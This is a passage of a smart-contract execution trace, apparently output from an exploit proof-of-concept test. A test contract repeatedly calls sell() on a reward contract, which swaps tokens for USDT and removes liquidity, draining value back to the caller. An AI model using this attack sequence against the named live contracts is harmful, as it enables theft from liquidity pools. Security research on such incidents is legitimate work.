    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 101656609034873697754575 [1.016e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 101656609034873697754575 [1.016e23]
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 101656609034873697754575 [1.016e23]
    │   │   ├─ [73957] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::sell(101656609034873697754575 [1.016e23])
    │   │   │   ├─ [4134] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 101656609034873697754575 [1.016e23])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 101656609034873697754575 [1.016e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3674] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 5082830451743684887728 [5.082e21])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 5082830451743684887728 [5.082e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 69983235352903958120372 [6.998e22], 3780534441210728903557252 [3.78e24], 1717861306 [1.717e9]
    │   │   │   ├─ [439] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 512601748935269669940997 [5.126e23]
    │   │   │   ├─ [537] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::balanceOf(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 1312347628756340897752 [1.312e21]
    │   │   │   ├─ [33008] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::swapExactTokensForTokens(48286889291565006433423 [4.828e22], 0, [0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1717861306 [1.717e9])
    │   │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 69983235352903958120372 [6.998e22], 3780534441210728903557252 [3.78e24], 1717861306 [1.717e9]
    │   │   │   │   ├─ [5015] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 48286889291565006433423 [4.828e22])
    │   │   │   │   │   ├─ [472] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::d000b517(000000000000000000000000cc0f0f41f4c4c17493517dd6c6d9dd1adb134fc9) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 48286889291565006433423 [4.828e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [18437] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::swap(880409542656800625435 [8.804e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 880409542656800625435 [8.804e20])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 880409542656800625435 [8.804e20])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 69102825810247157494937 [6.91e22]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3828821330502293909990675 [3.828e24]
    │   │   │   │   │   ├─ emit Sync(reserve0: 69102825810247157494937 [6.91e22], reserve1: 3828821330502293909990675 [3.828e24])
    │   │   │   │   │   ├─ emit Swap(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0In: 0, amount1In: 48286889291565006433423 [4.828e22], amount0Out: 880409542656800625435 [8.804e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] [48286889291565006433423 [4.828e22], 880409542656800625435 [8.804e20]]
    │   │   │   ├─ [23574] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 48286889291565006433423 [4.828e22])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 48286889291565006433423 [4.828e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 48286889291565006433423 [4.828e22]
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 48286889291565006433423 [4.828e22]
    │   │   ├─ [73957] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::sell(48286889291565006433423 [4.828e22])
    │   │   │   ├─ [4134] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 48286889291565006433423 [4.828e22])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 48286889291565006433423 [4.828e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3674] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 2414344464578250321671 [2.414e21])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 2414344464578250321671 [2.414e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 69102825810247157494937 [6.91e22], 3828821330502293909990675 [3.828e24], 1717861306 [1.717e9]
    │   │   │   ├─ [439] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 512601748935269669940997 [5.126e23]
    │   │   │   ├─ [537] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::balanceOf(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 1312347628756340897752 [1.312e21]
    │   │   │   ├─ [33008] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::swapExactTokensForTokens(22936272413493378055875 [2.293e22], 0, [0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1717861306 [1.717e9])
    │   │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 69102825810247157494937 [6.91e22], 3828821330502293909990675 [3.828e24], 1717861306 [1.717e9]
    │   │   │   │   ├─ [5015] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 22936272413493378055875 [2.293e22])
    │   │   │   │   │   ├─ [472] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::d000b517(000000000000000000000000cc0f0f41f4c4c17493517dd6c6d9dd1adb134fc9) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 22936272413493378055875 [2.293e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [18437] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::swap(410467774383721314282 [4.104e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 410467774383721314282 [4.104e20])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 410467774383721314282 [4.104e20])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 68692358035863436180655 [6.869e22]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3851757602915787288046550 [3.851e24]
    │   │   │   │   │   ├─ emit Sync(reserve0: 68692358035863436180655 [6.869e22], reserve1: 3851757602915787288046550 [3.851e24])
    │   │   │   │   │   ├─ emit Swap(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0In: 0, amount1In: 22936272413493378055875 [2.293e22], amount0Out: 410467774383721314282 [4.104e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] [22936272413493378055875 [2.293e22], 410467774383721314282 [4.104e20]]
    │   │   │   ├─ [23574] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22936272413493378055875 [2.293e22])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 22936272413493378055875 [2.293e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 22936272413493378055875 [2.293e22]
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 22936272413493378055875 [2.293e22]
    │   │   ├─ [73957] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::sell(22936272413493378055875 [2.293e22])
    │   │   │   ├─ [4134] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 22936272413493378055875 [2.293e22])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 22936272413493378055875 [2.293e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3674] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 1146813620674668902793 [1.146e21])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 1146813620674668902793 [1.146e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 68692358035863436180655 [6.869e22], 3851757602915787288046550 [3.851e24], 1717861306 [1.717e9]
    │   │   │   ├─ [439] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 512601748935269669940997 [5.126e23]
    │   │   │   ├─ [537] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::balanceOf(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 1312347628756340897752 [1.312e21]
    │   │   │   ├─ [33008] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::swapExactTokensForTokens(10894729396409354576540 [1.089e22], 0, [0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1717861306 [1.717e9])
    │   │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 68692358035863436180655 [6.869e22], 3851757602915787288046550 [3.851e24], 1717861306 [1.717e9]
    │   │   │   │   ├─ [5015] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 10894729396409354576540 [1.089e22])
    │   │   │   │   │   ├─ [472] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::d000b517(000000000000000000000000cc0f0f41f4c4c17493517dd6c6d9dd1adb134fc9) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 10894729396409354576540 [1.089e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [18437] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::swap(193265893612836533645 [1.932e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 193265893612836533645 [1.932e20])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 193265893612836533645 [1.932e20])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 68499092142250599647010 [6.849e22]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3862652332312196642623090 [3.862e24]
    │   │   │   │   │   ├─ emit Sync(reserve0: 68499092142250599647010 [6.849e22], reserve1: 3862652332312196642623090 [3.862e24])
    │   │   │   │   │   ├─ emit Swap(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0In: 0, amount1In: 10894729396409354576540 [1.089e22], amount0Out: 193265893612836533645 [1.932e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] [10894729396409354576540 [1.089e22], 193265893612836533645 [1.932e20]]
    │   │   │   ├─ [23574] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10894729396409354576540 [1.089e22])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10894729396409354576540 [1.089e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 10894729396409354576540 [1.089e22]
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 10894729396409354576540 [1.089e22]
    │   │   ├─ [93746] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::sell(10894729396409354576540 [1.089e22])
    │   │   │   ├─ [4134] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 10894729396409354576540 [1.089e22])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 10894729396409354576540 [1.089e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3674] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 544736469820467728827 [5.447e20])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 544736469820467728827 [5.447e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 68499092142250599647010 [6.849e22], 3862652332312196642623090 [3.862e24], 1717861306 [1.717e9]
    │   │   │   ├─ [439] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 512601748935269669940997 [5.126e23]
    │   │   │   ├─ [537] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::balanceOf(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 1312347628756340897752 [1.312e21]
    │   │   │   ├─ [78192] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::removeLiquidity(0x55d398326f99059fF775485246999027B3197955, 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 686759254936787005205 [6.867e20], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1717861306 [1.717e9])
    │   │   │   │   ├─ [23476] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 686759254936787005205 [6.867e20])
    │   │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 686759254936787005205 [6.867e20])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [52187] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::burn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 68499092142250599647010 [6.849e22]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3862652332312196642623090 [3.862e24]
    │   │   │   │   │   ├─ [354] 0xB018B22b54AD66B4D369082d394076DaC327ACbA::feeTo() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: 0x0000000000000000000000000000000000000000, value: 686759254936787005205 [6.867e20])
    │   │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 91771800586265190491 [9.177e19])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 91771800586265190491 [9.177e19])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [28413] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5174996463294443423850 [5.174e21])
    │   │   │   │   │   │   ├─ [4075] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::userRewardInfo(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000001043561a88293000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5174996463294443423850 [5.174e21])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 68407320341664334456519 [6.84e22]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3857477335848902199199240 [3.857e24]
    │   │   │   │   │   ├─ emit Sync(reserve0: 68407320341664334456519 [6.84e22], reserve1: 3857477335848902199199240 [3.857e24])
    │   │   │   │   │   ├─ emit Burn(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0: 91771800586265190491 [9.177e19], amount1: 5174996463294443423850 [5.174e21], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Return] 91771800586265190491 [9.177e19], 5174996463294443423850 [5.174e21]
    │   │   │   │   └─ ← [Return] 91771800586265190491 [9.177e19], 5174996463294443423850 [5.174e21]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 5174996463294443423850 [5.174e21]
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 5174996463294443423850 [5.174e21]
    │   │   ├─ [93746] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::sell(5174996463294443423850 [5.174e21])
    │   │   │   ├─ [4134] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 5174996463294443423850 [5.174e21])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 5174996463294443423850 [5.174e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3674] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 258749823164722171192 [2.587e20])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 258749823164722171192 [2.587e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 68407320341664334456519 [6.84e22], 3857477335848902199199240 [3.857e24], 1717861306 [1.717e9]
    │   │   │   ├─ [439] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 511914989680332882935792 [5.119e23]
    │   │   │   ├─ [537] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::balanceOf(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 625588373819553892547 [6.255e20]
    │   │   │   ├─ [78192] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::removeLiquidity(0x55d398326f99059fF775485246999027B3197955, 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 326210646094973827472 [3.262e20], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1717861306 [1.717e9])
    │   │   │   │   ├─ [23476] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 326210646094973827472 [3.262e20])
    │   │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 326210646094973827472 [3.262e20])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [52187] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::burn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
